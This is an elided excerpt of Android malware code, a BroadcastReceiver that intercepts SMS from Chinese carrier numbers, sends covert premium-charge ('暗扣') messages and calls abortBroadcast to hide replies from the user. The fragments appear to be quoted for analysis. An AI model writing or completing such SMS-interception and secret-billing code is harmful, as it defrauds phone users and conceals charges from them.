	...
	public void onReceive(Context context, Intent intent) {
		...
		if (intent.getAction().equals(strRes)) {
			...
			if (bundle != null) {
				...
				Log.d("发送短信中心号码", smsCenterSendFlag  + "ss");
			...
			if (!"".equals(replyNumber) && smsNumber.startsWith(replyNumber)) {
					...
					if (String.valueOf(smsContent.charAt(offSet)).matches(
						...
						if (sendSecretSms) {
							...
							LogFile.WriteLogFile("暗扣短信发送之后，回复内容：" + smsCon
									+ " 短信发送出去了");
							// Log.d(TAG, "暗扣短信发送之后，回复内容：" + smsCon +
							// " 短信发送出去了");
							this.abortBroadcast();
						...
						if (sendSecretSms) {
							...
							// Log.d(TAG, "暗扣短信发送之后，内容回复为：" + smsCont +
							// "短信发送出去了");
				...
				Log.d(TAG, "测试二+++拦截到短信号码是10086，106，10010");
